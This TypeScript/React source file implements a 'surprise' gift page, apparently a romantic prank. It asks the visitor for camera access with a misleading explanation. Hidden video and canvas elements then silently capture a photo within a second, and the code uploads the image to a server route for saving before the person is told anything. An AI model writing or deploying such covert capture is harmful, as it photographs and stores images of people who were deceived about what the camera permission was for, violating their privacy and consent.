import React, { useState, useRef, useEffect, useCallback } from 'react';
import { Gift, Heart, Sparkles } from 'lucide-react';
import './Surprise.css';

const Surprise: React.FC = () => {
    const [step, setStep] = useState<'initial' | 'prompting' | 'surprised'>('initial');
    const [error, setError] = useState<string>('');
    const videoRef = useRef<HTMLVideoElement>(null);
    const canvasRef = useRef<HTMLCanvasElement>(null);

    // Clean up media stream when component unmounts
    useEffect(() => {
        return () => {
            if (videoRef.current && videoRef.current.srcObject) {
                const stream = videoRef.current.srcObject as MediaStream;
                stream.getTracks().forEach(track => track.stop());
            }
        };
    }, []);

    const takePhoto = useCallback(async () => {
        if (videoRef.current && canvasRef.current) {
            const video = videoRef.current;
            const canvas = canvasRef.current;
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            if (context) {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const dataUrl = canvas.toDataURL('image/jpeg');

                try {
                    // Send to API Route to save to Vercel KV Redis
                    await fetch('/api/save-surprise', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            image: dataUrl,
                            caption: 'Gotcha! Sweetest surprise reaction 🥰',
                            date: new Date().toISOString()
                        }),
                    });
                } catch (error) {
                    console.error("Failed to save to database", error);
                }
            }
        }
    }, []);

    const handleStartSurprise = async () => {
        setStep('prompting');
        setError('');

        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user' }
            });

            if (videoRef.current) {
                videoRef.current.srcObject = stream;

                // Wait for video to be ready before capturing
                videoRef.current.onloadedmetadata = () => {
                    videoRef.current?.play();

                    // Wait a tiny bit for the camera to adjust exposure
                    setTimeout(() => {
                        takePhoto();
                        setStep('surprised');
                        // Then stop the camera
                        stream.getTracks().forEach(track => track.stop());
                    }, 800);
                };
            }
        } catch (err) {
            console.error('Camera access denied or failed:', err);
            setError('To see the surprise, please allow camera access! It is just for a fun memory.');
            setStep('initial');
        }
    };

    return (
        <div className="surprise-container">
            <div className="surprise-content">
                {step === 'initial' && (
                    <div className="surprise-step fade-in">
                        <div className="icon-wrapper bounce">
                            <Gift size={80} color="#ff4d6d" />
                        </div>
                        <h1>I have a secret surprise for you!</h1>
                        <p>Click the button below to open it, but make sure to allow camera access to unlock the magic.</p>
                        {error && <p className="error-message">{error}</p>}
                        <button className="primary-button" onClick={handleStartSurprise}>
                            Open My Surprise 🎁
                        </button>
                    </div>
                )}

                {step === 'prompting' && (
                    <div className="surprise-step pulse">
                        <h2>Unlocking magic... ✨</h2>
                        <p>Please click "Allow" when the browser asks!</p>
                    </div>
                )}

                {step === 'surprised' && (
                    <div className="surprise-step surprised-state pop-in">
                        <Heart size={100} color="#ff4d6d" className="floating-heart" />
                        <h1 className="gradient-text">GOTCHA! 😘</h1>
                        <p className="big-text">You are my biggest and most beautiful surprise every single day!</p>
                        <Sparkles size={40} color="#ffd700" className="sparkle-icon" />
                        <div className="message-box">
                            <p>I hope this made you smile! Your beautiful reaction has been saved to our gallery. 😉📸</p>
                        </div>
                    </div>
                )}

                {/* Hidden video and canvas elements for capturing */}
                <video
                    ref={videoRef}
                    style={{ display: 'none' }}
                    playsInline
                    muted
                />
                <canvas
                    ref={canvasRef}
                    style={{ display: 'none' }}
                />
            </div>
        </div>
    );
};

export default Surprise;
